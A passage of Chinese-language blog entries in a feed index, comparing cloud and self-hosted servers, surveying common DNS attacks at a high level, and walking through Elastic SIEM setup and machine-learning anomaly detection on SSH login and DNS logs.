版權軟體，實體機買斷長期較便宜，花同樣錢雲端開到同規格會比較貴</li><li>雲端服務大多提供快照、快速恢復的功能</li><li>實體機較容易遇到道路施工挖電纜影響，以前就至少遇過兩次服務需要中斷一點時間的狀況</li><li>DDoS 等攻擊實體機需要透過配置防範，雲端大多有整合相關服務</li><li>實體機擴充較不容易，雲端服務可幾分鐘內完成可擴充彈性大，早期就遇過硬碟最大才 2T，每過一段時間，資料庫都要定期移轉資料到其他機台的狀況</li><li>如果套用了一些雲端微服務，可能會造成系統架構更複雜難懂，按照教學用了不太懂的服務後帳單突然變很貴，我之前同事就遇過但還好一周內發現，寄信給 AWS 後有退款成功</li></ul><p>會適合用實體機自建的狀況:</p><ul><li>本來公司就有購買主機、相關版權，像之前公司有買高級 NAS，拿來架 WordPress 官網前面掛個 Cloudfare 其實很夠用</li><li>公司有 MIS、維運團隊、架構師</li></ul><p>會適合用雲端服務的狀況:</p><ul><li>團隊較小，產品還沒穩定營利前</li><li>第一次申請完全可以先只用免費的額度，早期 Azure 還有新創方案超便宜</li></ul>]]></content>
      
      
      <categories>
          
          <category> ElasticCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticCloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elastic Anomaly Detection for Cybersecurity</title>
      <link href="/2020/09/22/elastic-anomaly-detection-for-cybersecurity/"/>
      <url>/2020/09/22/elastic-anomaly-detection-for-cybersecurity/</url>
      
        <content type="html"><![CDATA[<h2 id="DNS-常見攻擊與可能的偵測方法"><a href="#DNS-常見攻擊與可能的偵測方法" class="headerlink" title="DNS 常見攻擊與可能的偵測方法"></a>DNS 常見攻擊與可能的偵測方法</h2><p>這篇文章會簡介 DNS 常見攻擊方式與透過 Elastic Machine learning 工具可能的偵測方法。</p><p>當然，最好的方式就是花錢解決問題，像是直接使用 cloudflare、GCP、AWS 提供的服務，這幾間都是世界上前幾大的公司，相對一些普通規模的主機商要被打爆的機率也就小很多了。</p><p>近年來什麼東西都要加個雲端才夠潮，所以網路安全也就越來越重要，整個網路每天都一定會用到的服務就是 DNS (Domain Name System)，中文名稱是網域名稱系統。</p><p>DNS 的用途是把比較難記的 IP 跟比較好記的網域進行對應連結，這樣就可以透過 <a href="https://web.ncku.edu.tw/">web.ncku.edu.tw</a> 而不是 <a href="http://140.116.241.51/">140.116.241.51</a> 去進行連線。</p><p>DNS 運作原理，簡單來說就是給網域回答 IP 地址，網路上目前也提供非常多 <a href="https://www.whois.net/">WHOIS</a> 的相關服務，有興趣的話可以玩看看。</p><blockquote><p>WHOIS<br><img src="/2020/09/22/elastic-anomaly-detection-for-cybersecurity/WHOIS.JPG" alt="WHOIS"></p></blockquote><p>問網域會有兩種詢問的方法</p><ul><li>Recursive: Client 透過 DNS 代理去問</li><li>Iterative: Client 慢慢問，不會一次就問到結果</li></ul><blockquote><p>Recursive VS Iterative<br><img src="/2020/09/22/elastic-anomaly-detection-for-cybersecurity/DNS.png" alt="DNS"></p></blockquote><p>DNS 主要會有以下紀錄</p><ul><li>A&#x2F;AAAA: 網域對應到 IPv4 &#x2F; IPv6 的位置</li><li>CNAME: 網域對應到另一個網域</li><li>MX: 紀錄這個網域的郵件伺服器</li><li>NS: Name Server 找不到可以去問的地方</li></ul><h3 id="DNS-攻擊"><a href="#DNS-攻擊" class="headerlink" title="DNS 攻擊"></a>DNS 攻擊</h3><p>越多人用的服務當然也就會成為攻擊的目標，常看到的</p><ul><li>DDoS，Nginx 基本可防呆，cloudflare 也可幫擋</li><li>DNS Amplification: DDoS 的另外一種技巧</li><li>DNS Cache Poisoning: 加入偽造惡意記錄到，把使用者導到惡意 IP，可透過 DNSSEC 防範</li><li>MITMA: 中間人攻擊，透過介入傳輸從轉發資料到竄改欺騙的過程，可透過 PKI 認證防範</li><li>DNS Hijacking: 直接控制，都被綁架了主機沒有備份大概就是付贖金了</li><li>DNS Pharming: 網址嫁接，讓使用者進到偽造的網站</li><li>DNS Tunneling: DNS 必備企業防火牆大多不擋，所以將其他通訊協定封裝到 DNS 協定中傳輸，產生 DNS Tunneling 看起來蠻多野蠻方便的，開源的列出以下兩個<ul><li><a href="https://github.com/yarrick/iodine">iodine</a></li><li><a href="https://github.com/alex-sector/dns2tcp">DNS2TCP</a></li></ul></li></ul><blockquote><p>可憐的主機商，又被 DDoS 了<br><img src="/2020/09/22/elastic-anomaly-detection-for-cybersecurity/DDoS.JPG" alt="DDoS"></p></blockquote><h3 id="C-C-與威脅地圖"><a href="#C-C-與威脅地圖" class="headerlink" title="C&amp;C 與威脅地圖"></a>C&amp;C 與威脅地圖</h3><p>要達到監控和了解威脅，需要從各種來源去收集資料，目標是去偵測出 C&amp;C 伺服器相關的活動，C&amp;C (Command &amp; Control Server) 是控制僵屍網路的主控伺服器，會和感染了惡意軟體 (malware) 的主機進行通訊並指揮攻擊行為。</p><p>從另外一個方面來看，malware 理論上也會內建一套尋找 C&amp;C 的方法，如果可以在被攻擊前，透過分析數據提早抓到在溝通也許就能預防，我猜防毒軟體提供的<a href="https://cybermap.kaspersky.com/ja">全球威脅地圖</a>也是透過分析和監控相關數據得來的。</p><blockquote><p>威脅地圖<br><img src="/2020/09/22/elastic-anomaly-detection-for-cybersecurity/CyberThreat.JPG" alt="CyberThreat"></p></blockquote><h3 id="DNS-資料分析"><a href="#DNS-資料分析" class="headerlink" title="DNS 資料分析"></a>DNS 資料分析</h3><p>Elastic 最方便的方式是透過機器學習的工具來分析，下面會使用教學範例中提供的 <code>security-analytics-packetbeat-\*</code> 來做示範。</p><blockquote><p>建立，Datafeed 請設定 <code>&#123;&quot;term&quot;:&#123;&quot;type&quot;:&#123;&quot;value&quot;:&quot;dns&quot;,&quot;boost&quot;:1&#125;&#125;&#125;</code><br><img src="/2020/09/22/elastic-anomaly-detection-for-cybersecurity/CreateJobAdvanced.JPG" alt="CreateJobAdvanced"></p></blockquote><blockquote><p>設定 Detector 如圖<br><img src="/2020/09/22/elastic-anomaly-detection-for-cybersecurity/ConfigureDetector.JPG" alt="ConfigureDetector"></p></blockquote><blockquote><p>設定 Bucket Span 及 Influencer，接著下一步其他都用預設值即可<br><img src="/2020/09/22/elastic-anomaly-detection-for-cybersecurity/ConfigBucketInfluencer.JPG" alt="ConfigBucketInfluencer"></p></blockquote><blockquote><p>AnomalyExplorer 看結果<br><img src="/2020/09/22/elastic-anomaly-detection-for-cybersecurity/AnomalyExplorer.png" alt="AnomalyExplorer"></p></blockquote><p>這次照著教學做完，覺得蠻神奇的，因為馬上就可以看出一些資訊，像是可以看出哪個網域或是哪個 Host Name 最有可能出現問題。</p><p>整個 Anomaly Explorer 的面板右半邊會是依照時間分析的結果圖表，左半天可以看到我們設定的 Influencer 相關聚合統計，有點像是知道筆電裡面分別會有幾筆蘋果華碩聯想的概念。</p><p>另外也有附上可以互動的表，下圖就是選擇 Critical 後的結果，然後有點選 Actual 按照大小排列。</p><blockquote><p>CriticalAnomalies<br><img src="/2020/09/22/elastic-anomaly-detection-for-cybersecurity/CriticalAnomalies.JPG" alt="CriticalAnomalies"></p></blockquote><p>看完也做過之後，發現其實相關步驟都不難，難的是要知道怎麼去設定相關配置，如果一個系統突然要自己設，可能也會不知道從何設起，認真讀一波文件後發現 Elastic 也有提供常見配置教學，覺得可以先從這些常見配置去推敲出為什麼需要這樣設定，文件連結在此:</p><p><a href="https://www.elastic.co/guide/en/machine-learning/current/ootb-ml-jobs.html">https://www.elastic.co/guide/en/machine-learning/current/ootb-ml-jobs.html</a></p><p>另外也附上 Detector 會需要知道的相關機器學習 functions 文件連結:</p><p><a href="https://www.elastic.co/guide/en/machine-learning/current/ml-functions.html">https://www.elastic.co/guide/en/machine-learning/current/ml-functions.html</a></p>]]></content>
      
      
      <categories>
          
          <category> ElasticCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticCloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elastic Machine Learning 基礎介紹</title>
      <link href="/2020/09/21/elastic-machine-learning-fundamentals/"/>
      <url>/2020/09/21/elastic-machine-learning-fundamentals/</url>
      
        <content type="html"><![CDATA[<h2 id="Elastic-Machine-Learning-基礎介紹"><a href="#Elastic-Machine-Learning-基礎介紹" class="headerlink" title="Elastic Machine Learning 基礎介紹"></a>Elastic Machine Learning 基礎介紹</h2><p>這篇文章會介紹 Elastic Machine Learning 中的名詞、相關流程與案例介紹，機器學習解決問題主要分兩種</p><ul><li>分群、分類 (Classification): 將資料分成不同的群組，群組內的成員都是類似的</li><li>回歸 (Regression): 了解兩個或多個變數間是否相關，還有相關方向與強度</li></ul><p>機器學習使用的方法:</p><ul><li>監督學習 (Supervised Learning): 輸入和輸出之間存在某一種關係或模式，要先把資料都進行標記，像是 “幾歲” 的 “女孩子” 購買 “名牌包” 比例最高</li><li>非監督學習 (Unsupervised Learning ): 不需要先進行標記，輸入數據，依據不同變量，找出相似或相關的群，傳統一定會上到的例子就是買尿布會順便買啤酒</li></ul><p>資料:</p><ul><li>時間序列資料 (Time Series)</li><li>面板數據 (Panel Data)</li><li>橫截面數據 (Cross Section)</li></ul><p>Elastic Machine Learning 中的資料異常偵測是透過非監督學習來分類時間序列的資料，可以回答像是下面的問題</p><ul><li>網路正在被攻擊嗎?</li><li>網路系統有在恢復中嗎?</li><li>哪些類型的使用者現在暴露在危險中?</li></ul><blockquote><p>Elastic Machine Learning 異常偵測<br><img src="/2020/09/21/elastic-machine-learning-fundamentals/AnomalyDetection.png" alt="AnomalyDetection"></p></blockquote><h2 id="異常偵測應用"><a href="#異常偵測應用" class="headerlink" title="異常偵測應用"></a>異常偵測應用</h2><p>現在的系統、網路架構越來越複雜，攻擊行為也越來越多樣，難以透過設定規則、資料標記來逐一處理，所以透過收集相關紀錄後分析也許是一個比較好的解決方式，網路安全主要蒐集以下資訊</p><p>SSH logs 可以透過 Filebeat 紀錄</p><ul><li>Timestamp</li><li>SSH Server Host Name</li><li>SSh Client IP</li><li>User</li><li>Authentication Method</li><li>IP Geo Information</li></ul><p>DNS Traffic</p><ul><li>Timestamp</li><li>Client IP</li><li>Source Host</li><li>Destination IP</li><li>Highest Registered Domain</li><li>Subdomain</li></ul><p>Elastic Machine Learning 透過非監督學習來分類時間序列的資料後，其實可以大致分出項基本的決策樹</p><blockquote><p>Elastic Machine Learning 異常行為決策樹<br><img src="/2020/09/21/elastic-machine-learning-fundamentals/AnomalyDetectionTaxonomy.png" alt="AnomalyDetectionTaxonomy"></p></blockquote><p>偵測異常的行為流程大致如下</p><ul><li>將 SIEM 中的資料餵給機器學習任務</li><li>機器學習開始運算，會透過相關模型運算更新模型</li><li>儲存計算結果提供 Kibana 查看</li><li>端點防護工具監看數據或是設置告警機制</li></ul><blockquote><p>異常行為偵測流程<br><img src="/2020/09/21/elastic-machine-learning-fundamentals/AnomalyDetectionSequence.png" alt="AnomalyDetectionSequence"></p></blockquote><h3 id="Machine-learning-job"><a href="#Machine-learning-job" class="headerlink" title="Machine learning job"></a>Machine learning job</h3><p>使用上，需要先準備資料，資料部分則可以分析 Elasticsearch 中的或是額外透過 API 餵進來。</p><p>有資料後需要建立任務，任務可以透過 API 或是 Kibana UI 建立，一個機器學習任務包含配置資訊及所需的 Metadata，配置流程大致如下</p><ul><li>Job Type<ul><li>Single Metric</li><li>Multi Metric: 可以看成跑了好幾個 Single 的概念</li><li>Advanced</li><li>Population</li></ul></li><li>設定 Data Feed: 提供 Elasticsearch 中時間序列資料<ul><li>Index Pattern</li><li>Query</li><li>Time Range</li></ul></li><li>設定 buckets: buckets 是切割時間序列資料的單位，通常是五分鐘到一小時，設定太長會增加運算負擔也較難看出結果，建議依照資料型態決定，最後每個 bucket 都會得到計算後的分數<blockquote><p>Bucket 中的最大值<br><img src="/2020/09/21/elastic-machine-learning-fundamentals/Bucket.png" alt="Bucket"></p></blockquote></li><li>設定 Detectors: 每個 Detector 會針對資料中的欄位套用一種分析函式，像是最大最小、平均、極端值，最大就會找出某個 bucket 中的最大</li><li>設定 Influencer: 建議設置但也不能設定太多，因為太多會增加閱讀難度<ul><li>方便找兇手，像是如果可以從 IP 看出可疑活動就可以直接設定 IP</li><li>協助簡化、聚合結果資料</li></ul></li><li>執行並查看 Job 結果<ul><li>Single Metric Viewer</li><li>Anomaly Explorer</li></ul></li><li>監看即時資料<ul><li>排程</li><li>Query</li><li>Condition</li><li>Action</li></ul></li></ul><h3 id="常見用法案例"><a href="#常見用法案例" class="headerlink" title="常見用法案例"></a>常見用法案例</h3><ul><li>low_request_rate: 透過 low_count function 去找到比較低流量的資料</li><li>response_code_rates: 透過 count function 並透過 code 切割資料去找到特殊 code 像是 404 的相關異常</li><li>url_scanning: 透過 high_distinct_count function，最後透過可以透過相關分布看出是不是有哪些 IP 常打特定 URL</li></ul><blockquote><p>透過機率預測數據應該會出現在哪裏<br><img src="https://www.elastic.co/guide/en/machine-learning/current/images/ml-gs-job1-analysis.jpg" alt="ExpectedValues"></p></blockquote><p>接下來會示範如何設定與使用 Elastic Machine Learning (機器學習)，機器學習讓我們能夠更快的分析與了解資料的狀況，提供異常的告警，甚至是未來數據的預測。</p><h3 id="Elastic-Machine-Learning-配置"><a href="#Elastic-Machine-Learning-配置" class="headerlink" title="Elastic Machine Learning 配置"></a>Elastic Machine Learning 配置</h3><p>如果只是啟用而沒有進行相關配置的話就能夠單純的看到目前資料的相關統計</p><ul><li><p>連到 kibana</p></li><li><p>Management ➔ License Management 開始 30 天試用</p><blockquote><p>開啟 30 天試用<br><img src="/2020/09/21/elastic-machine-learning-fundamentals/License.JPG" alt="License"></p></blockquote></li><li><p>啟用之後就可以先用 ML 的資料視覺化工具看目前資料狀況</p></li><li><p>Machine Learning ➔ Data Visualizer</p></li><li><p>選取想要查看的 Index</p><blockquote><p>選取 Index<br><img src="/2020/09/21/elastic-machine-learning-fundamentals/SelectIndex.JPG" alt="SelectIndex"></p></blockquote><blockquote><p>相關統計資料，先點選 <code>Use full filebeat-* data</code><br><img src="/2020/09/21/elastic-machine-learning-fundamentals/Observations1.JPG" alt="Observations1"></p></blockquote><blockquote><p>詳細到可以看出從哪個網域、IP 連進來的<br><img src="/2020/09/21/elastic-machine-learning-fundamentals/Observations2.JPG" alt="Observations2"></p></blockquote></li></ul><h3 id="Elastic-Machine-Learning-Job"><a href="#Elastic-Machine-Learning-Job" class="headerlink" title="Elastic Machine Learning Job"></a>Elastic Machine Learning Job</h3><p>要進行機器學習分析，首先我們要建立一個 Job 去偵測可疑的登入行為，建立前要先預備資料，因為這次只需要 failed 或是 invalid 的資料，先到 Discover 透過 filter 設定以下篩選條件，最後記得把這個 Search 的結果儲存。</p><ul><li>system.auth.ssh.event</li><li>is one of</li><li>[Failed, Invalid]</li></ul><blockquote><p>設定篩選條件<br><img src="/2020/09/21/elastic-machine-learning-fundamentals/IncludesFailAndInvalid.JPG" alt="IncludesFailAndInvalid"></p></blockquote><p>然後就可以按教學影片去建立一個 Job，這裡提供舊版的影片，包含 <a href="https://www.elastic.co/videos/machine-learning-tutorial-creating-a-single-metric-job">Single Metric</a> 跟 <a href="https://www.elastic.co/videos/machine-learning-tutorial-creating-a-multi-metric-job">Multi Metric</a> 的過程，實際上流程差不多只是介面上稍有不同，這裡也簡單操作一次步驟如下:</p><ul><li><p>從側面選單到 Machine Learning</p></li><li><p>在 Overview tab 選擇 Create Job</p></li><li><p>選擇我們剛剛儲存的 Search</p><blockquote><p><img src="/2020/09/21/elastic-machine-learning-fundamentals/SelectIndex.JPG" alt="SelectIndex"></p></blockquote></li><li><p>選擇時間區間的時候預設可能會沒有資料，可以先點選 <code>Use full filebeat-* data</code></p><blockquote><p><img src="/2020/09/21/elastic-machine-learning-fundamentals/CreateJob.JPG" alt="CreateJob"></p></blockquote></li><li><p>選擇 Use a wizard 中的 Single 或是 Multi Metric</p><blockquote><p><img src="/2020/09/21/elastic-machine-learning-fundamentals/UseWizard.JPG" alt="UseWizard"></p></blockquote></li><li><p>Pick fields 欄位選 High count (Event rate)</p></li><li><p>Bucket Span 填 5m: 每次迭代運算的時間間隔</p><blockquote><p><img src="/2020/09/21/elastic-machine-learning-fundamentals/MultiMetricJob.JPG" alt="MultiMetricJob"></p></blockquote></li><li><p>Multi 可以多配置</p><ul><li>Split field: system.auth.hostname，設置後會自動加入 influencers</li><li>influencers: 可以補上 system.auth.user 及 system.auth.ssh.ip<ul><li>讓抓到兇手更簡單</li><li>讓結果更簡化聚合</li></ul></li></ul></li><li><p>在 Job ID 給一個命名</p><blockquote><p><img src="/2020/09/21/elastic-machine-learning-fundamentals/CreateJobDone.JPG" alt="CreateJobDone"></p></blockquote></li><li><p>最後執行這個 Job</p></li><li><p>結果會包含計算權重分數，透過圖表標示異常值</p><blockquote><p>權重分數在左側<br><img src="/2020/09/21/elastic-machine-learning-fundamentals/AnomalyExplorer.JPG" alt="AnomalyExplorer"></p></blockquote><blockquote><p>標示異常值<br><img src="/2020/09/21/elastic-machine-learning-fundamentals/ExploreResults.JPG" alt="ExploreResults"></p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> ElasticCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticCloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elastic SIEM 簡介</title>
      <link href="/2020/09/18/elastic-siem-ui/"/>
      <url>/2020/09/18/elastic-siem-ui/</url>
      
        <content type="html"><![CDATA[<h2 id="Elastic-SIEM-簡介"><a href="#Elastic-SIEM-簡介" class="headerlink" title="Elastic SIEM 簡介"></a>Elastic SIEM 簡介</h2><p>這篇文章會分享 Elastic SIEM 簡介與 UI 功能介紹，Elastic 提供了一套免費基於 Elastic Stack 的 Elastic SIEM，在安全性資訊與事件管理上，以第一次接觸這類工具的前端工程師來說，覺得應該算是免費又好用的工具吧?</p><p>Elastic 提供了一套免費基於 Elastic Stack 的 <a href="https://www.elastic.co/siem">Elastic SIEM</a>，一套 SIEM 主要結合了:</p><ul><li>SIM (security information management)</li><li>SEM (security event management)</li></ul><p>那一套完整的 Elastic Stack 版本的 SIEM 需要包含以下元件，有少當然還是可以跑只是資訊跟功能就不那麼完整。</p><ul><li>Elastic Endpoint Security: 回傳端點威脅預防、偵測、回應相關的事件跟警告</li><li>Beats: 透過 Beats 蒐集各種相關的安全資訊</li><li>Elasticsearch: 即時、分散式儲存、全文檢索引擎、資料分析</li><li>Kibana: Elasticsearch 的 GUI 管理介面</li></ul><p>選配的元件或功能</p><ul><li>機器學習</li><li><a href="https://www.elastic.co/products/stack/alerting">告警</a></li><li>Canvas</li></ul><blockquote><p>Elastic SIEM 系統架構<br><img src="https://www.elastic.co/guide/en/siem/guide/current/images/siem-architecture.png" alt="ElasticSIEM.png"><br>來源: <a href="https://www.elastic.co/guide/en/siem/guide/current/images/siem-architecture.png">https://www.elastic.co/guide/en/siem/guide/current/images/siem-architecture.png</a></p></blockquote><h3 id="SIEM-資料流程"><a href="#SIEM-資料流程" class="headerlink" title="SIEM 資料流程"></a>SIEM 資料流程</h3><p>SIEM 會從各式來源擷取與分析資料，來源涵蓋了 Elastic Endpoint Security、Beats、APM transactions 或是任何只要能夠符合 ECS 規格的資料，最後都會將各式資訊彙整成同樣的 schema 存入 Elasticsearch，方便集中管理、分析、聚合相關的事件，這樣不管是要資料分析或是做機器學習都更加方便。</p><blockquote><p>SIEM 會從各式來源擷取與分析資料<br><img src="/2020/09/18/elastic-siem-ui/SecurityData.png" alt="SecurityData"><br>來源: <a href="https://learn.elastic.co/">https://learn.elastic.co/</a></p></blockquote><blockquote><p>ECS 規格會定義相關需要的欄位<br><img src="/2020/09/18/elastic-siem-ui/ClientFieldECS.JPG" alt="ClientFieldECS"></p></blockquote><blockquote><p>將各式資訊彙整成同樣的 schema 存入 Elasticsearch<br><img src="/2020/09/18/elastic-siem-ui/ElasticSIEM.png" alt="ElasticSIEM"><br>來源: <a href="https://learn.elastic.co/">https://learn.elastic.co/</a></p></blockquote><h3 id="SIEM-資料來源"><a href="#SIEM-資料來源" class="headerlink" title="SIEM 資料來源"></a>SIEM 資料來源</h3><p>資料來源雖然涵蓋了很多部分，但資料彙整後主要歸類成主機相關、網路相關兩大類，使用上原則上就是照著提示進行安裝和啟用，安裝完成後要確認一下是不是真的有出現在 kibana 介面中即可。</p><ul><li>主機相關<ul><li>Auditbeat<ul><li>System module<ul><li>packages</li><li>processes</li><li>logins</li><li>sockets</li><li>users and groups</li></ul></li><li>Audit module: linux kernel</li></ul></li><li>Filebeat<ul><li>system logs (linux)</li><li>santa (mac)</li></ul></li><li>Winlogbeat<ul><li>Windows event logs</li></ul></li></ul></li><li>網路相關<ul><li>Packetbeat<ul><li>流量</li><li>DNS</li></ul></li><li>Filebeat<ul><li>網路層相關軟硬體的 log</li></ul></li></ul></li></ul><blockquote><p>elastic-agent-7.9.1-windows-x86_64 設置並啟用後在 Ingest Manager 中會看到已經上線<br><img src="/2020/09/18/elastic-siem-ui/Fleet.JPG" alt="Fleet"></p></blockquote><h3 id="SIEM-操作介面"><a href="#SIEM-操作介面" class="headerlink" title="SIEM 操作介面"></a>SIEM 操作介面</h3><p>SIEM 的操作介面一樣是長在 kibana 裡面的 Security，減少了我們跟艱澀資料互動的複雜度，介面竟然還支援拖拉設定極複雜的條件設定查詢，打開 Security 後主要會看到搜尋的介面跟幾個 Tab。</p><ul><li>搜尋介面<ul><li><a href="https://www.elastic.co/guide/en/kibana/7.8/kuery-query.html">KQL</a>(Kibana Query Language): 可以看成 kibana 的 SQL<ul><li>範例: <code>response:200 and extension:php</code></li></ul></li><li>filter: 過濾條件提供存檔跟訂選</li><li>搜尋條件存檔</li></ul></li><li>Overview Tab<ul><li>Alerts Trend: <a href="https://www.elastic.co/guide/en/siem/guide/current/rules-ui-create.html">相關觸發規則</a></li><li>External alerts count</li><li>Events count</li><li>Host and network events</li></ul></li><li>Detections Tab<ul><li>因為我的電腦沒中毒或執行奇怪程式所以都不會有紀錄</li></ul></li><li>Host Tab<ul><li>主機相關資料: Auditbeat、Winlogbeat<blockquote><p><img src="/2020/09/18/elastic-siem-ui/Host.JPG" alt="Host"></p></blockquote></li></ul></li><li>Network Tab<ul><li>網路相關資料: Packetbeat + Filebeat</li><li>發現有提供 GeoIP 的支援<blockquote><p><img src="/2020/09/18/elastic-siem-ui/Network.JPG" alt="Network"></p></blockquote></li></ul></li><li>Timelines Tab<ul><li>設定檢索的區間、也提供相關 filter 的建立</li><li>筆電平常都只有用 Chrome 上網，所以我用 <code>Traveler-PC</code> + <code>chrome.exe</code> 相關關鍵字就可以篩出相關事件<blockquote><p><img src="/2020/09/18/elastic-siem-ui/TimelineFilter.JPG" alt="TimelineFilter"></p></blockquote></li></ul></li></ul><p>剛剛做了 Elastic SIEM 簡介與 UI 功能介紹，接下來會更深入了解相關概念以及看看 SIEM 究竟能夠幫我們解決什麼問題，還有 SIEM 中的機器學習是怎麼一回事。</p><p>Elastic SIEM 透過分析儲存在 Elasticsearch 中規格符合 ECS 的資料，可能可以幫助我們解答</p><ul><li>偵測系統發生異常</li><li>實體機最近硬碟快滿了，最晚什麼時候一定要處理?</li></ul><p>為什麼資料格式一致 (符合 ECS) 很重要?</p><ul><li>在資料探勘或機器學習中，資料乾淨成效較佳</li><li>資料不一致會造成閱讀和理解上困難，像是怎麼知道是 12&#x2F;24 時制?</li></ul><h3 id="SIEM-中的資料"><a href="#SIEM-中的資料" class="headerlink" title="SIEM 中的資料"></a>SIEM 中的資料</h3><p>雖然之前介紹了各式各樣的指標或日誌資料，但對系統來說主要還是分成兩大塊，不要問為什麼分兩大塊，這就跟為什麼要分成動物跟植物兩類一樣，其實是透過資料的特性自動分出來的。</p><ul><li>主機相關<ul><li>Auditbeat、Winlogbeat 較適合蒐集主機相關資料</li></ul></li><li>網路相關<ul><li>Packetbeat、Filebeat 較適合蒐集網路相關資料</li></ul></li></ul><p>怎麼取資料回 SIEM?</p><ul><li>ECS 定義了共同的欄位</li><li>所有的 Beats 回傳的資料都會符合 ECS</li><li>相關分類與適用的 Beat 如下圖</li></ul><blockquote><p>資料決策樹<br><img src="/2020/09/18/elastic-siem-ui/DataToSIEM.png" alt="DataToSIEM"></p></blockquote><h4 id="ECS"><a href="#ECS" class="headerlink" title="ECS"></a>ECS</h4><p><a href="https://www.elastic.co/guide/en/ecs/current/ecs-field-reference.html">ECS 定義了一系列的欄位</a>，當 logs 或是 metrics 的事件資料需要存入 Elasticsearch 都需要確認符合，反過來說任何 Elastic Beats 只要傳輸符合 ECS 規格的資料，都可以存到 Elasticsearch，其中有個重要的事情是每筆事件都需要包含一個 timestamp。</p><p>ECS 規格中有個比較特別是 <a href="https://www.elastic.co/guide/en/ecs/1.6/ecs-geo.html">Geo</a> 的格式，其他相關的也可以從 <a href="https://www.elastic.co/guide/en/ecs/current/ecs-field-reference.html">ECS 文件中</a>或是 <a href="https://github.com/elastic/ecs">ECS Github</a> 中查詢相關規格，因為小編最早開始是在 GIS 公司服務，每次遇到地理資訊類訊息都會特別注意一下，Elasticsearch 主要是透過 <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/geoip-processor.html">GeoIP Processor</a> 把 IP Address 轉成經緯度地理位置，利用 <a href="https://dev.maxmind.com/geoip/geoip2/geolite2/">Maxmind Geolite2</a> 的數據去核對 IP Address 與地理訊息，當然我們也可以不自己架設，純前端的話也可以透過 <a href="https://www.geojs.io/">geojs</a> 的服務達到就是了。</p><p>透過這個 ECS，就可以做到類似 GA 的分析</p><blockquote><p>因為目前沒有真實資料，就先截 GA 的圖給大家看<br><img src="/2020/09/18/elastic-siem-ui/GeoIP.JPG" alt="GeoIP"></p></blockquote><h2 id="異常偵測"><a href="#異常偵測" class="headerlink" title="異常偵測"></a>異常偵測</h2><p>因為 Elastic 儲存的資料理論上都應該帶有 timestamp，所以異常偵測可以透過把時間序列的資料加上一個正常行為的基準參考值去偵測不正常的 patterns。</p><blockquote><p>發現異常點並標註<br><img src="https://www.elastic.co/guide/en/machine-learning/current/images/overview-smv.jpg" alt="Anomaly"><br>圖片來源: <a href="https://www.elastic.co/guide/en/machine-learning/current/ml-overview.html">https://www.elastic.co/guide/en/machine-learning/current/ml-overview.html</a></p></blockquote><h2 id="Elastic-機器學習"><a href="#Elastic-機器學習" class="headerlink" title="Elastic 機器學習"></a>Elastic 機器學習</h2><p>既然資料都規格一致了，Elastic SIEM 當然內建了針對異常偵測的機器學習功能，會透過 Elasticsearch 中儲存的資料自動幫我們偵測主機和網路相關的異常，如果資料能夠有 pattern 甚至可以做到預測未來，像是知道主機的硬碟什麼時候可能會用滿等等。</p><p>要幾分鐘入門資料探勘或機器學習概念的話，建議去載個 <a href="https://www.cs.waikato.ac.nz/ml/weka/">Weka</a> 然後搭配每個上過資料探勘都會用到的<a href="http://archive.ics.uci.edu/ml/datasets/zoo">動物園資料</a>，接著照著各式教學你就可以得到下圖，網路上教學非常多，這邊就不贅述，而且最困難的通常是第一個步驟也就是要整理資料，像是補缺項、過濾不符合規格的值等等，這個部分都透過 ECS 的定義解決了。</p><blockquote><p>照著各式教學你就可以得到下圖<br><img src="/2020/09/18/elastic-siem-ui/DataWekaZoo.png" alt="DataWekaZoo"></p></blockquote><p>我們就會發現，這不就類似剛剛說的 SIEM 中的資料主要分成兩大塊，其實更細節的分類決策樹如下:</p><blockquote><p><img src="/2020/09/18/elastic-siem-ui/MachineLearingOfSIEM.png" alt="MachineLearingOfSIEM"></p></blockquote><p>機器學習中有個經典的概念，就是什麼樣的事情是可以預測的，答案就是只要能夠有 Pattern 就可以預測，像是小孩為什麼會哭女朋友為什麼會生氣，這兩個顯然都沒有? 遇到這類沒有 Pattern 的問題，只要先努力展現求生意識就對了? 但如果是晴天、雨天、平日、假日的停車格數量就可能會有，也比較有機會能夠做到預知未來。</p><blockquote><p>預測未來<br><img src="https://www.elastic.co/guide/en/machine-learning/current/images/overview-forecast.jpg" alt="Forecast"><br>圖片來源: <a href="https://www.elastic.co/guide/en/machine-learning/current/ml-overview.html">https://www.elastic.co/guide/en/machine-learning/current/ml-overview.html</a></p></blockquote><h2 id="Elastic-Security"><a href="#Elastic-Security" class="headerlink" title="Elastic Security"></a>Elastic Security</h2><p>Elastic 的系統安全 &#x3D; SIEM + ECR，提供了</p><ul><li>一套能夠辨識出攻擊還有系統錯誤的引擎</li><li>一個分流和整合相關資訊的工作區</li><li>提供將事件過程與關係變成可互動、視覺化的介面</li><li>案例管理和自動操作</li><li>使用內建的機器學習功能去偵測系統異常和攻擊</li></ul>]]></content>
      
      
      <categories>
          
          <category> ElasticCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticCloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elastic Endgame 簡介</title>
      <link href="/2020/09/17/elastic-endpoint-security-application/"/>
      <url>/2020/09/17/elastic-endpoint-security-application/</url>
      
